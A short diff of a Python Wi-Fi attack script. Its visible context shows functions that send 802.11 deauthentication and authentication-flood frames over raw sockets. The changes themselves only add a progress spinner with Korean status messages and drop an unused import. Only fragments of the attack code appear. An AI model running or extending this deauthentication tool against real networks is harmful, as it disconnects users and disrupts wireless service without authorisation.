@@ -2,7 +2,6 @@ import socket
 import sys
 import os
 import time
-import random
 from struct import *
 
 class RadiotapHeader :
@@ -55,13 +54,13 @@ class FixedParameter :
         self.Auth_SEQ = b'\x01\x00'
         self.Status_cod = b'\x00\x00'
 
+progress = [' / ', ' | ', ' \\ ', '---']
 
 def beacon_check(interface_name, bssid) :
     try:
         rawSocket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
         rawSocket.bind((interface_name,0))
         rawSocket.settimeout(0.3)
-        # if 
         packet = rawSocket.recvfrom(2048)[0]
         # 인터페이스 패킷 캡처
         rawSocket.close()
@@ -111,6 +110,7 @@ def deauth_attack(ap, station, seq) :
         rawSocket.bind((interface_name,0))
         rawSocket.send(radiotap_header_packet + deauthentication_packet)
         rawSocket.close()
+        print("\rDeauthentication 전송 중 " + progress[seq % 4], end='')
         time.sleep(0.01)
 
 def auth_attack(ch, ap, station, seq) :
@@ -141,7 +141,7 @@ def auth_attack(ch, ap, station, seq) :
         rawSocket.bind((interface_name,0))
         rawSocket.send(radiotap_header2_packet + authentication_packet + fixedparameter_packet)
         rawSocket.close()
-
+        print("\rAuthentication 전송 중 " + progress[seq % 4], end='')
         time.sleep(0.01)
 
 
